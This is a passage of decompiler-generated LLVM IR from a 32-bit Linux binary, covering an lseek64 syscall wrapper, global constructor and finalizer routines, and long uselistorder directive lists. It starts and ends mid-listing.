  uselistorder i32 %v1_80522a3, { 2, 1, 0 }
  uselistorder i8 %v2_80522b230, { 0, 2, 1 }
  uselistorder i32* @ecx, { 6, 92, 0, 93, 24, 7, 94, 1, 95, 25, 26, 18, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 15, 53, 54, 55, 56, 57, 58, 16, 59, 14, 88, 89, 90, 91, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 9, 137, 112, 113, 114, 138, 10, 139, 143, 19, 20, 60, 61, 62, 63, 64, 65, 66, 17, 67, 8, 68, 69, 70, 71, 72, 11, 12, 2, 3, 73, 74, 13, 75, 76, 77, 78, 79, 81, 82, 83, 84, 22, 23, 80, 85, 141, 86, 142, 21, 87, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 5, 107, 108, 109, 4, 110, 111, 140 }
  uselistorder i32 -256, { 1, 76, 75, 0, 125, 3, 78, 77, 2, 24, 25, 26, 27, 28, 29, 30, 31, 134, 32, 62, 63, 64, 96, 135, 127, 128, 136, 122, 123, 33, 34, 35, 36, 37, 4, 38, 39, 5, 40, 41, 42, 43, 44, 45, 46, 47, 49, 48, 50, 51, 52, 53, 54, 56, 57, 58, 55, 59, 60, 61, 65, 66, 67, 68, 69, 70, 71, 72, 73, 12, 74, 13, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 97, 15, 16, 17, 18, 19, 20, 21, 22, 23, 98, 14, 99, 100, 101, 102, 103, 104, 11, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 120, 119, 121, 124, 6, 126, 133, 130, 8, 131, 9, 132, 7, 129, 10 }
  uselistorder i8 0, { 4, 133, 132, 3, 60, 61, 157, 158, 6, 135, 134, 5, 136, 137, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 2, 118, 78, 79, 180, 80, 181, 184, 119, 22, 34, 120, 7, 183, 163, 164, 165, 166, 167, 168, 169, 170, 171, 23, 172, 81, 82, 35, 1, 17, 18, 19, 16, 0, 24, 25, 26, 83, 84, 152, 153, 85, 86, 87, 88, 89, 90, 91, 92, 8, 93, 94, 9, 95, 96, 97, 98, 99, 100, 101, 102, 58, 182, 103, 104, 10, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 121, 122, 123, 124, 125, 126, 127, 128, 27, 129, 130, 131, 28, 138, 139, 140, 141, 142, 143, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 21, 144, 145, 146, 147, 148, 149, 150, 151, 154, 155, 156, 11, 159, 160, 20, 161, 12, 162, 173, 178, 177, 13, 174, 175, 15, 176, 14, 179, 59, 29, 30, 31, 32, 33 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80522bc, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_80522b8, { 1, 0 }
}

define i32 @__libc_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_80522c6 = load i32, i32* @ebx, align 4
  store i32 %v0_80522c6, i32* %stack_var_-12, align 4
  %v2_80522da = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_80522da, i32* %esi.global-to-local, align 4
  %v1_80522f1 = call i32 @int80_syscall(i32 140)
  store i32 %v1_80522f1, i32* %esi.global-to-local, align 4
  %tmp18 = icmp ult i32 %v1_80522f1, -4095
  br i1 %tmp18, label %dec_label_pc_805230b, label %dec_label_pc_80522fd

dec_label_pc_80522fd:                             ; preds = %entry
  %v2_80522de = ashr i32 %arg3, 31
  %v1_80522fd = call i32 @__errno_location(i32 %v2_80522de)
  %v0_8052302 = load i32, i32* %esi.global-to-local, align 4
  %v1_8052302 = sub i32 0, %v0_8052302
  %v2_8052304 = inttoptr i32 %v1_80522fd to i32*
  store i32 %v1_8052302, i32* %v2_8052304, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_805231f.pre.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_805230f

dec_label_pc_805230b:                             ; preds = %entry
  %v1_805230b = icmp eq i32 %v1_80522f1, 0
  br i1 %v1_805230b, label %dec_label_pc_8052314, label %dec_label_pc_805230f

dec_label_pc_805230f:                             ; preds = %dec_label_pc_805230b, %dec_label_pc_80522fd
  %v2_805231f.pre = phi i32 [ %v0_80522c6, %dec_label_pc_805230b ], [ %v2_805231f.pre.pre, %dec_label_pc_80522fd ]
  %v0_805230f = phi i32 [ %v1_80522f1, %dec_label_pc_805230b ], [ -1, %dec_label_pc_80522fd ]
  %v1_8052311 = ashr i32 %v0_805230f, 31
  br label %dec_label_pc_805231c

dec_label_pc_8052314:                             ; preds = %dec_label_pc_805230b
  %v3_8052314 = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_805231c

dec_label_pc_805231c:                             ; preds = %dec_label_pc_805230f, %dec_label_pc_8052314
  %v2_805231f = phi i32 [ %v2_805231f.pre, %dec_label_pc_805230f ], [ %v0_80522c6, %dec_label_pc_8052314 ]
  %v0_8052322 = phi i32 [ %v0_805230f, %dec_label_pc_805230f ], [ %v3_8052314, %dec_label_pc_8052314 ]
  %storemerge = phi i32 [ %v1_8052311, %dec_label_pc_805230f ], [ %tmp, %dec_label_pc_8052314 ]
  store i32 %storemerge, i32* @edx, align 4
  store i32 %v2_805231f, i32* @ebx, align 4
  ret i32 %v0_8052322

; uselistorder directives
  uselistorder i32 %v1_80522f1, { 1, 2, 0, 3 }
  uselistorder i32 %v0_80522c6, { 1, 0, 2 }
  uselistorder i32* @edx, { 15, 1, 16, 102, 21, 22, 23, 24, 25, 26, 27, 117, 5, 2, 17, 103, 28, 29, 30, 31, 32, 33, 34, 35, 36, 158, 159, 160, 161, 6, 162, 163, 122, 123, 0, 19, 124, 167, 168, 172, 171, 165, 83, 7, 84, 85, 86, 87, 88, 89, 90, 20, 127, 128, 8, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 9, 142, 143, 125, 126, 144, 10, 145, 170, 37, 116, 38, 39, 40, 41, 42, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 14, 60, 61, 43, 62, 11, 63, 64, 66, 12, 67, 68, 69, 70, 71, 18, 13, 65, 72, 166, 73, 118, 119, 164, 169, 157, 120, 121, 113, 74, 75, 76, 77, 78, 79, 80, 81, 82, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 104, 105, 106, 107, 108, 109, 110, 111, 112, 114, 115, 146, 147, 148, 149, 151, 155, 150, 153, 154, 3, 152, 156, 4, 173 }
  uselistorder i32 (i32)* @__errno_location, { 54, 53, 52, 24, 51, 50, 30, 49, 23, 13, 12, 11, 10, 9, 58, 8, 22, 21, 7, 17, 48, 47, 40, 39, 57, 56, 55, 20, 19, 46, 29, 45, 44, 43, 0, 14, 35, 6, 5, 42, 32, 31, 28, 4, 16, 1, 27, 15, 34, 26, 25, 41, 3, 2, 38, 37, 36, 59, 33, 18 }
  uselistorder i32 31, { 18, 19, 20, 21, 22, 23, 11, 2, 3, 0, 1, 10, 27, 15, 16, 17, 6, 7, 4, 5, 12, 8, 9, 24, 25, 26, 13, 14, 28, 29, 30, 31, 32, 33, 34, 35, 36 }
  uselistorder i32 140, { 1, 0 }
  uselistorder label %dec_label_pc_805231c, { 1, 0 }
}

define i32 @__do_global_ctors_aux() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp6, i32* %stack_var_-16, align 4
  %v0_805233c = load i32, i32* @global_var_8055100.151, align 256
  %v10_8052341 = icmp eq i32 %v0_805233c, -1
  br i1 %v10_8052341, label %dec_label_pc_8052352, label %dec_label_pc_8052346.preheader

dec_label_pc_8052346.preheader:                   ; preds = %entry
  br label %dec_label_pc_8052346

dec_label_pc_8052346:                             ; preds = %dec_label_pc_8052346.preheader, %dec_label_pc_8052346
  %v4_8052349 = phi i32 [ %v0_805233c, %dec_label_pc_8052346.preheader ], [ %v2_805234b, %dec_label_pc_8052346 ]
  %v0_8052346 = phi i32 [ ptrtoint (i32* @global_var_8055100.151 to i32), %dec_label_pc_8052346.preheader ], [ %v1_8052346, %dec_label_pc_8052346 ]
  %v1_8052346 = add i32 %v0_8052346, -4
  call void @__pseudo_call(i32 %v4_8052349)
  %v1_805234b = inttoptr i32 %v1_8052346 to i32*
  %v2_805234b = load i32, i32* %v1_805234b, align 4
  %v10_805234d = icmp eq i32 %v2_805234b, -1
  %v1_8052350 = icmp eq i1 %v10_805234d, false
  br i1 %v1_8052350, label %dec_label_pc_8052346, label %dec_label_pc_8052352.loopexit

dec_label_pc_8052352.loopexit:                    ; preds = %dec_label_pc_8052346
  %v2_8052352.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_8052352

dec_label_pc_8052352:                             ; preds = %dec_label_pc_8052352.loopexit, %entry
  %v2_8052352 = phi i32 [ %v2_8052352.pre, %dec_label_pc_8052352.loopexit ], [ %tmp6, %entry ]
  ret i32 %v2_8052352

; uselistorder directives
  uselistorder i32 %v0_805233c, { 1, 0 }
  uselistorder i1 false, { 507, 1, 344, 345, 346, 52, 112, 113, 114, 115, 116, 117, 456, 439, 440, 442, 441, 2, 347, 348, 349, 350, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 68, 128, 129, 130, 131, 132, 133, 134, 275, 276, 277, 278, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 508, 509, 49, 151, 53, 152, 153, 154, 457, 458, 459, 510, 524, 525, 526, 527, 528, 531, 54, 532, 533, 530, 523, 511, 83, 155, 156, 157, 158, 159, 160, 512, 513, 279, 280, 281, 282, 283, 284, 3, 384, 4, 385, 386, 399, 111, 516, 517, 518, 519, 520, 521, 522, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 460, 473, 474, 475, 476, 477, 478, 479, 480, 36, 482, 481, 486, 483, 484, 485, 5, 487, 488, 161, 162, 447, 529, 163, 164, 165, 55, 427, 428, 429, 430, 432, 431, 6, 433, 166, 7, 167, 434, 435, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 195, 194, 8, 196, 197, 198, 199, 200, 202, 37, 203, 201, 204, 206, 205, 9, 207, 208, 210, 209, 56, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 108, 109, 235, 236, 514, 57, 515, 10, 237, 238, 450, 266, 239, 69, 58, 59, 240, 241, 242, 243, 244, 245, 246, 247, 11, 12, 248, 249, 250, 251, 252, 253, 254, 255, 70, 256, 257, 258, 259, 260, 261, 262, 263, 264, 50, 265, 267, 60, 71, 72, 38, 73, 268, 270, 269, 14, 13, 271, 272, 273, 274, 285, 286, 287, 288, 289, 290, 291, 294, 74, 292, 293, 21, 22, 295, 67, 34, 39, 296, 297, 298, 66, 299, 300, 301, 302, 303, 305, 75, 304, 19, 20, 306, 40, 307, 308, 309, 310, 311, 312, 313, 314, 317, 76, 315, 316, 17, 18, 318, 41, 319, 320, 321, 322, 323, 324, 327, 77, 325, 326, 15, 16, 328, 42, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 351, 352, 353, 78, 369, 79, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 61, 62, 370, 371, 372, 373, 374, 375, 376, 377, 35, 378, 80, 379, 380, 381, 81, 382, 383, 82, 387, 388, 389, 390, 391, 392, 393, 394, 395, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 396, 397, 24, 398, 23, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 43, 411, 412, 413, 414, 415, 51, 416, 417, 418, 419, 420, 421, 422, 423, 424, 65, 425, 44, 45, 426, 25, 437, 436, 26, 438, 27, 443, 444, 445, 28, 446, 0, 448, 449, 451, 452, 46, 453, 454, 455, 504, 489, 490, 491, 492, 497, 501, 502, 503, 29, 493, 63, 494, 495, 496, 47, 33, 498, 32, 48, 31, 499, 500, 30, 505, 506, 110, 64 }
  uselistorder void (i32)* @__pseudo_call, { 3, 2, 5, 0, 6, 7, 8, 4, 1 }
  uselistorder i32 -4, { 16, 17, 18, 12, 19, 50, 51, 52, 53, 58, 59, 60, 61, 9, 62, 1, 57, 63, 64, 65, 66, 67, 68, 13, 54, 55, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 6, 4, 5, 7, 2, 56, 0, 10, 31, 32, 33, 34, 8, 15, 35, 36, 37, 38, 39, 40, 41, 11, 42, 43, 44, 45, 46, 47, 14, 3, 48, 49 }
  uselistorder i32 ptrtoint (i32* @global_var_8055100.151 to i32), { 0, 2, 3, 4, 5, 1 }
  uselistorder i32 -1, { 27, 28, 72, 150, 7, 73, 151, 258, 152, 153, 154, 155, 157, 156, 70, 8, 158, 159, 29, 15, 67, 160, 259, 161, 74, 75, 162, 76, 163, 135, 164, 77, 165, 166, 131, 79, 78, 167, 168, 169, 81, 80, 82, 170, 171, 11, 172, 173, 83, 84, 174, 85, 86, 175, 87, 176, 88, 177, 89, 178, 90, 179, 91, 180, 92, 181, 93, 182, 94, 183, 95, 184, 0, 30, 1, 185, 71, 96, 97, 186, 187, 188, 189, 190, 191, 99, 98, 100, 192, 101, 193, 16, 194, 136, 195, 273, 196, 197, 31, 270, 271, 34, 33, 35, 36, 18, 37, 102, 38, 198, 32, 272, 9, 199, 200, 201, 137, 202, 39, 2, 103, 266, 260, 269, 203, 204, 205, 206, 104, 105, 207, 208, 12, 209, 13, 261, 262, 14, 210, 211, 263, 4, 40, 41, 3, 212, 148, 149, 213, 106, 214, 107, 19, 215, 5, 42, 108, 216, 109, 217, 68, 69, 218, 110, 219, 111, 220, 112, 221, 113, 222, 114, 223, 115, 224, 116, 225, 117, 226, 118, 227, 119, 228, 120, 229, 121, 230, 122, 231, 123, 232, 124, 233, 43, 234, 235, 139, 236, 140, 237, 138, 264, 265, 141, 44, 45, 46, 20, 21, 22, 23, 24, 25, 26, 47, 238, 48, 239, 49, 240, 50, 241, 51, 242, 52, 243, 53, 244, 54, 55, 57, 56, 58, 245, 61, 59, 60, 17, 10, 62, 63, 142, 143, 268, 267, 246, 144, 247, 248, 249, 250, 64, 251, 133, 134, 132, 65, 125, 126, 127, 128, 129, 130, 66, 252, 253, 254, 255, 256, 257, 6, 145, 146, 147 }
  uselistorder i32 1, { 335, 337, 336, 71, 694, 695, 696, 216, 697, 217, 218, 121, 122, 120, 123, 249, 203, 339, 338, 124, 125, 340, 142, 250, 251, 736, 737, 738, 739, 193, 698, 699, 700, 341, 63, 608, 342, 19, 20, 279, 609, 610, 611, 219, 280, 612, 343, 613, 220, 614, 615, 355, 354, 353, 352, 351, 350, 349, 348, 347, 346, 345, 344, 152, 154, 149, 146, 150, 145, 148, 153, 147, 151, 672, 673, 0, 51, 50, 49, 48, 47, 356, 155, 156, 357, 31, 32, 616, 617, 358, 68, 67, 69, 798, 799, 800, 106, 107, 105, 618, 359, 53, 56, 57, 58, 55, 54, 619, 252, 362, 361, 360, 363, 100, 364, 365, 84, 367, 366, 64, 368, 157, 369, 158, 370, 159, 371, 160, 372, 62, 374, 373, 43, 375, 10, 377, 376, 102, 378, 382, 381, 380, 379, 59, 803, 804, 805, 384, 383, 61, 60, 253, 386, 385, 389, 388, 387, 161, 254, 315, 579, 204, 395, 394, 393, 392, 391, 390, 163, 162, 801, 398, 397, 396, 129, 127, 128, 281, 399, 674, 675, 676, 308, 677, 400, 27, 28, 25, 26, 255, 401, 29, 30, 703, 185, 188, 704, 325, 402, 22, 24, 21, 23, 403, 37, 34, 33, 35, 39, 38, 36, 136, 133, 135, 137, 132, 134, 282, 405, 404, 283, 406, 284, 407, 285, 410, 409, 408, 316, 413, 412, 411, 164, 286, 750, 751, 752, 414, 141, 753, 754, 194, 755, 756, 757, 140, 138, 139, 317, 749, 221, 165, 166, 167, 287, 758, 759, 760, 761, 762, 763, 764, 765, 766, 222, 767, 768, 769, 770, 771, 258, 772, 773, 184, 259, 774, 775, 776, 777, 256, 257, 778, 779, 780, 417, 416, 415, 79, 81, 82, 80, 83, 260, 261, 418, 262, 263, 223, 422, 421, 420, 419, 78, 224, 318, 423, 424, 425, 426, 427, 428, 429, 430, 431, 678, 679, 432, 46, 435, 434, 433, 52, 436, 620, 621, 333, 437, 85, 727, 728, 729, 730, 731, 732, 733, 622, 288, 289, 623, 438, 13, 12, 11, 290, 291, 440, 439, 9, 8, 7, 292, 293, 294, 441, 17, 16, 18, 442, 444, 443, 264, 624, 625, 626, 326, 15, 14, 627, 628, 580, 226, 629, 630, 631, 632, 633, 635, 636, 637, 227, 638, 639, 319, 225, 640, 228, 641, 642, 643, 634, 448, 447, 446, 445, 111, 113, 112, 108, 110, 109, 114, 644, 449, 97, 94, 96, 95, 229, 450, 645, 646, 452, 451, 103, 104, 647, 648, 207, 206, 202, 649, 265, 650, 651, 205, 652, 230, 653, 295, 654, 454, 453, 74, 76, 75, 77, 231, 296, 1, 297, 455, 266, 456, 457, 144, 143, 802, 459, 458, 168, 169, 267, 806, 460, 170, 298, 655, 461, 463, 462, 118, 464, 93, 465, 181, 466, 171, 467, 92, 468, 72, 469, 98, 73, 471, 470, 101, 472, 86, 473, 70, 474, 172, 475, 477, 476, 65, 478, 66, 479, 45, 481, 480, 99, 482, 115, 119, 656, 196, 197, 307, 215, 657, 2, 3, 186, 306, 658, 581, 659, 660, 661, 662, 663, 582, 583, 584, 664, 665, 268, 232, 666, 208, 299, 320, 667, 187, 189, 190, 195, 300, 489, 488, 487, 334, 486, 485, 484, 483, 327, 89, 91, 90, 668, 669, 495, 494, 493, 492, 328, 491, 490, 321, 670, 671, 496, 585, 680, 681, 586, 233, 587, 234, 588, 235, 236, 589, 237, 238, 590, 591, 592, 498, 497, 176, 177, 682, 683, 684, 685, 209, 686, 687, 688, 182, 506, 505, 504, 503, 502, 501, 500, 499, 87, 88, 689, 690, 210, 691, 692, 693, 183, 514, 513, 512, 511, 510, 509, 508, 507, 116, 117, 701, 593, 594, 191, 595, 596, 597, 192, 598, 269, 322, 702, 515, 520, 519, 518, 517, 516, 329, 40, 42, 41, 705, 4, 323, 521, 706, 707, 526, 525, 524, 523, 522, 130, 131, 708, 600, 601, 602, 211, 603, 604, 605, 606, 607, 709, 532, 531, 530, 529, 528, 527, 180, 178, 179, 309, 599, 533, 710, 534, 173, 174, 239, 536, 535, 270, 241, 711, 277, 240, 278, 712, 713, 539, 538, 537, 310, 714, 715, 540, 301, 271, 272, 716, 542, 541, 717, 718, 543, 273, 302, 242, 719, 720, 549, 548, 547, 546, 545, 544, 721, 722, 212, 274, 723, 243, 244, 724, 725, 552, 551, 550, 330, 175, 726, 554, 553, 555, 201, 734, 557, 556, 735, 558, 311, 740, 741, 312, 742, 743, 313, 314, 744, 745, 559, 746, 213, 747, 275, 303, 563, 562, 561, 560, 304, 214, 245, 748, 565, 564, 566, 5, 568, 567, 569, 781, 782, 783, 791, 792, 200, 793, 572, 571, 570, 44, 305, 6, 574, 573, 331, 246, 784, 199, 785, 786, 247, 787, 198, 789, 790, 248, 276, 324, 788, 332, 794, 795, 575, 796, 797, 126, 577, 576, 578 }
  uselistorder label %dec_label_pc_8052346, { 1, 0 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  %v0_805235b = load i32, i32* @ebx, align 4
  %v1_805235c = call i32 @__get_pc_thunk_bx(i32 %v0_805235b)
  store i32 %v1_805235c, i32* @eax, align 4
  %v0_8052367 = call i32 @__do_global_dtors_aux()
  ret i32 %v0_8052367

; uselistorder directives
  uselistorder i32* @eax, { 8, 0, 26, 27, 97, 85, 99, 100, 101, 102, 104, 20, 105, 1, 103, 4, 7, 98, 61, 9, 23, 24, 63, 25, 86, 88, 89, 87, 90, 91, 93, 94, 92, 2, 28, 30, 29, 31, 32, 34, 22, 33, 35, 36, 37, 38, 10, 39, 40, 41, 42, 43, 11, 44, 45, 12, 13, 46, 47, 48, 49, 14, 50, 15, 51, 16, 52, 17, 53, 18, 54, 55, 56, 57, 58, 59, 60, 19, 62, 21, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 80, 77, 78, 79, 81, 82, 83, 84, 5, 106, 95, 96, 3, 6 }
  uselistorder i32 (i32)* @__get_pc_thunk_bx, { 1, 0 }
  uselistorder i32 0, { 604, 605, 13, 52, 842, 87, 88, 112, 606, 607, 608, 9, 215, 114, 113, 609, 610, 216, 611, 612, 613, 486, 614, 615, 616, 617, 115, 487, 116, 900, 901, 117, 902, 903, 904, 53, 98, 217, 105, 488, 99, 618, 118, 619, 14, 100, 89, 620, 197, 119, 621, 90, 622, 489, 623, 291, 624, 625, 626, 627, 628, 629, 630, 631, 120, 490, 632, 633, 634, 635, 121, 636, 491, 122, 192, 292, 123, 492, 493, 494, 218, 637, 776, 777, 778, 219, 211, 212, 779, 780, 781, 782, 783, 784, 495, 220, 638, 124, 496, 639, 125, 221, 222, 640, 641, 497, 642, 643, 644, 645, 83, 975, 976, 977, 978, 91, 198, 101, 646, 199, 498, 499, 500, 647, 126, 648, 912, 927, 928, 929, 293, 930, 649, 931, 980, 595, 981, 982, 983, 984, 596, 985, 932, 933, 986, 127, 987, 223, 998, 999, 12, 15, 501, 16, 111, 502, 503, 1009, 1013, 200, 1014, 128, 442, 294, 295, 0, 988, 989, 990, 129, 537, 461, 130, 504, 650, 1, 224, 225, 131, 651, 652, 132, 133, 654, 653, 655, 656, 296, 443, 657, 659, 658, 660, 991, 992, 134, 505, 997, 785, 786, 787, 788, 506, 507, 789, 281, 508, 226, 135, 136, 509, 597, 510, 598, 137, 511, 138, 512, 855, 54, 856, 857, 858, 2, 513, 881, 297, 599, 600, 601, 602, 514, 139, 1000, 444, 140, 227, 1002, 1005, 1004, 936, 937, 938, 939, 940, 228, 941, 942, 943, 298, 934, 299, 935, 300, 515, 516, 301, 445, 517, 302, 446, 141, 518, 944, 945, 142, 143, 303, 447, 107, 946, 947, 948, 144, 145, 304, 448, 106, 949, 201, 950, 96, 951, 952, 954, 519, 953, 3, 603, 4, 1003, 661, 662, 663, 664, 666, 665, 5, 229, 913, 914, 915, 905, 790, 146, 147, 520, 521, 230, 1010, 1012, 148, 667, 668, 108, 669, 149, 522, 670, 202, 102, 671, 55, 672, 48, 231, 232, 150, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 688, 151, 523, 689, 233, 690, 691, 692, 693, 694, 17, 18, 524, 213, 214, 695, 696, 697, 698, 19, 699, 700, 701, 20, 525, 702, 21, 22, 152, 526, 703, 704, 705, 708, 706, 707, 23, 49, 56, 709, 710, 711, 712, 282, 713, 714, 153, 715, 154, 716, 527, 203, 717, 155, 718, 528, 719, 720, 722, 723, 724, 725, 726, 727, 156, 529, 530, 157, 728, 729, 531, 730, 731, 732, 733, 734, 532, 735, 736, 234, 533, 235, 737, 738, 739, 740, 741, 742, 24, 57, 58, 59, 534, 743, 158, 535, 744, 449, 745, 746, 159, 536, 97, 47, 84, 721, 204, 747, 748, 993, 994, 205, 996, 995, 60, 305, 749, 979, 160, 859, 1001, 750, 891, 911, 918, 1006, 236, 973, 1011, 919, 974, 920, 886, 921, 922, 751, 1007, 1008, 25, 462, 193, 752, 194, 753, 755, 754, 756, 757, 463, 309, 310, 240, 241, 239, 758, 165, 759, 760, 761, 464, 311, 312, 762, 763, 465, 313, 314, 466, 315, 316, 26, 161, 162, 237, 306, 163, 467, 764, 164, 238, 765, 766, 206, 307, 450, 767, 308, 451, 166, 768, 317, 318, 242, 452, 453, 167, 257, 62, 770, 319, 769, 321, 322, 61, 320, 323, 324, 168, 771, 243, 772, 283, 773, 774, 775, 244, 337, 469, 338, 339, 245, 209, 210, 468, 791, 470, 340, 341, 334, 792, 794, 335, 336, 793, 66, 795, 284, 796, 797, 798, 799, 471, 342, 343, 331, 800, 802, 332, 333, 801, 65, 803, 804, 805, 806, 807, 808, 809, 472, 344, 345, 328, 810, 812, 329, 330, 811, 64, 813, 473, 346, 347, 325, 814, 816, 326, 327, 815, 63, 817, 474, 348, 349, 475, 350, 351, 476, 369, 370, 67, 828, 28, 818, 819, 820, 454, 259, 821, 822, 823, 824, 455, 258, 825, 826, 827, 27, 829, 830, 831, 10, 68, 838, 30, 832, 833, 834, 456, 260, 835, 836, 837, 29, 839, 840, 841, 11, 843, 261, 844, 31, 262, 845, 195, 846, 477, 352, 353, 478, 354, 355, 479, 356, 357, 480, 358, 359, 481, 360, 361, 196, 482, 362, 363, 847, 285, 848, 849, 850, 851, 246, 852, 457, 853, 854, 103, 104, 860, 861, 32, 264, 862, 286, 863, 864, 865, 866, 6, 867, 247, 868, 169, 33, 263, 869, 870, 871, 872, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 458, 584, 585, 459, 268, 586, 587, 588, 589, 265, 92, 266, 93, 267, 94, 590, 95, 591, 364, 592, 593, 34, 71, 873, 69, 70, 365, 874, 875, 876, 248, 877, 76, 878, 879, 880, 50, 72, 73, 74, 75, 460, 170, 171, 172, 173, 882, 884, 885, 109, 174, 110, 175, 176, 177, 269, 883, 287, 366, 367, 249, 270, 250, 7, 251, 483, 368, 887, 178, 179, 180, 181, 252, 888, 182, 183, 271, 889, 890, 184, 892, 893, 894, 484, 272, 185, 186, 274, 895, 187, 273, 896, 77, 35, 51, 36, 897, 253, 78, 79, 371, 86, 899, 254, 898, 373, 374, 80, 372, 375, 376, 906, 907, 288, 908, 909, 37, 910, 38, 289, 81, 485, 916, 188, 189, 377, 917, 190, 255, 923, 924, 925, 926, 256, 39, 955, 956, 957, 378, 379, 967, 40, 41, 85, 42, 277, 278, 958, 959, 960, 961, 207, 275, 276, 279, 962, 963, 964, 965, 43, 44, 82, 966, 290, 45, 46, 968, 969, 280, 8, 970, 971, 972, 191, 594, 208, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 1015, 1016, 1017, 1018, 1019, 1020, 1021, 1022 }
  uselistorder i32* @ebx, { 77, 92, 93, 251, 252, 94, 95, 96, 97, 98, 99, 100, 325, 326, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 101, 102, 103, 104, 2, 105, 106, 107, 3, 108, 4, 109, 110, 111, 112, 5, 113, 114, 115, 116, 117, 118, 119, 389, 390, 6, 391, 392, 395, 396, 120, 121, 313, 314, 315, 327, 7, 328, 329, 122, 330, 331, 397, 398, 399, 400, 401, 402, 403, 78, 404, 332, 333, 334, 335, 336, 405, 406, 407, 25, 26, 0, 420, 421, 422, 439, 440, 441, 442, 22, 8, 20, 423, 433, 437, 438, 408, 123, 124, 125, 126, 127, 128, 129, 130, 409, 410, 411, 412, 419, 232, 233, 79, 80, 81, 82, 83, 84, 267, 268, 9, 1, 269, 286, 287, 86, 270, 271, 272, 85, 87, 288, 289, 290, 429, 430, 88, 89, 90, 91, 337, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 10, 352, 353, 338, 339, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 23, 365, 366, 367, 368, 369, 11, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 427, 428, 131, 132, 133, 234, 235, 236, 237, 238, 443, 444, 445, 446, 447, 448, 449, 453, 454, 134, 135, 305, 306, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 12, 13, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 185, 186, 14, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 15, 200, 201, 202, 203, 204, 73, 74, 75, 76, 180, 182, 181, 183, 184, 16, 205, 206, 207, 208, 413, 17, 414, 415, 416, 417, 24, 18, 21, 418, 455, 456, 457, 458, 459, 209, 19, 210, 211, 212, 213, 214, 215, 216, 393, 394, 273, 274, 425, 426, 217, 218, 299, 300, 311, 312, 316, 317, 431, 432, 384, 385, 386, 450, 451, 452, 318, 319, 387, 388, 294, 295, 320, 321, 322, 323, 324, 219, 220, 221, 424, 434, 435, 436, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 263, 264, 265, 266, 275, 276, 277, 278, 279, 280, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 